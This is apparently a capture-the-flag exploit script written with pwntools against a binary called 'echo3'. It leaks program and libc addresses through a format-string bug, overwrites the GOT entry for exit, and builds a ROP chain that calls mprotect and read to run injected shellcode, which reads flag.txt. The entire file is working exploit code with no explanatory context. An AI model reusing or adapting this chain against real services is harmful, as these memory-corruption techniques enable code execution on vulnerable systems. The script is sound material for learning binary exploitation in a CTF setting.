from pwn import *


exe = ELF("echo3")
libc = ELF("./libc.so.6")

context.binary = exe
# context.log_level = 'error'

def conn():
    if args.REMOTE:
        # r = remote("128.199.12.141", 7015)
        r = remote("127.0.0.1", 7015)
    else:
        # r = exe.process()
        r = gdb.debug([exe.path])
    return r


# def exec_fmt(payload):
#     r = conn()
#     r.sendline(payload)
#     return r.recvline()
# autofmt = FmtStr(exec_fmt)
# print(autofmt.offset)


r = conn()

r.sendline(f"%{21}$lx".encode())
exe.address = int(r.recvline().decode().rstrip(),16) - exe.symbols['main']
log.info(f"leaked exe address @ {hex(exe.address)}")

r.sendline(f"%{17}$lx".encode())
libc.address = int(r.recvline().decode().rstrip(),16) - 0x2409b
log.info(f"leaked libc address @ {hex(libc.address)}")

ADD_RSP_18_RET = libc.address + 0x0000000000030ab6
POP_RSP_R14_RET = libc.address + 0x00000000000b4d9a
POP_RDI_RET = libc.address + 0x0000000000023a5f
POP_RSI_RET = libc.address + 0x000000000002440e
POP_RDX_RET = libc.address + 0x0000000000044198
# exit(0)
# r.sendline(fmtstr_payload(6, {libc.address + 0x213910: 7}))

r.send(fmtstr_payload(6, {exe.got['exit']: ADD_RSP_18_RET},write_size='short')[:63].ljust(63,b'\x00'))


rop = ROP(exe)


sc = asm(shellcraft.cat("flag.txt")) + asm(shellcraft.exit(0))

payload = flat([
    p64(0x69),
    p64(POP_RDI_RET),
    p64(exe.address + 0x6000),
    p64(POP_RSI_RET),
    p64(0x1000),
    p64(POP_RDX_RET),
    p64(7),
    p64(libc.symbols['mprotect']),
    p64(POP_RDI_RET),
    p64(0),
    p64(POP_RSI_RET),
    p64(exe.address + 0x6000 + 0x1f0),
    p64(POP_RDX_RET),
    p64(len(sc)),
    p64(libc.symbols['read']),
    p64(exe.address + 0x6000 + 0x1f0),

])


        # p64(POP_RSP_R14_RET),

r.send(flat({
    0: b'n' + b'\x00' * 7,
    0x10: [
        p64(POP_RDI_RET),
        p64(exe.address + 0x6078),
        p64(libc.symbols['gets']),
        # exe.symbols['main'],
        p64(POP_RSP_R14_RET),
        p64(exe.address + 0x6078),
    ]
}).ljust(63,b'\x00'))

r.sendline(payload)
# time.sleep(1)
r.send(sc)
r.interactive()
# r.close()
